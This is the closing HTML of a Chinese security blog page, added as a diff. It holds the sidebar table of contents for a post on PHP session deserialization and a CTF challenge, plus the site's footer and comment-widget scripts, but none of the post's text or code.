+    <a href="/2020/03/10/SVN-%E6%B3%84%E6%BC%8F-%E5%8F%8A-%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/" rel="next" title="SVN 泄漏 及 利用工具">
+      SVN 泄漏 及 利用工具 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#应用场景"><span class="nav-number">1.</span> <span class="nav-text">应用场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-反序列化与-Session"><span class="nav-number">2.</span> <span class="nav-text">PHP 反序列化与 Session</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-session-序列化机制"><span class="nav-number">2.1.</span> <span class="nav-text">PHP session 序列化机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session-序列化及反序列化处理器"><span class="nav-number">2.2.</span> <span class="nav-text">session 序列化及反序列化处理器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#与-session-相关的配置项"><span class="nav-number">2.3.</span> <span class="nav-text">与 session 相关的配置项</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#几种-处理器-的区别"><span class="nav-number">2.4.</span> <span class="nav-text">几种 处理器 的区别</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php处理器"><span class="nav-number">2.4.1.</span> <span class="nav-text">php处理器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-binary-处理器"><span class="nav-number">2.4.2.</span> <span class="nav-text">php_binary 处理器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-serialize-处理器"><span class="nav-number">2.4.3.</span> <span class="nav-text">php_serialize 处理器</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP-Session-中序列化的危害"><span class="nav-number">2.5.</span> <span class="nav-text">PHP Session 中序列化的危害</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#举个简单的例子"><span class="nav-number">2.5.1.</span> <span class="nav-text">举个简单的例子</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#再来看看一道-ctf-的题目"><span class="nav-number">3.</span> <span class="nav-text">再来看看一道 ctf 的题目</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : 'ff88d73e2fcdb1144bb17825816c90d1',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
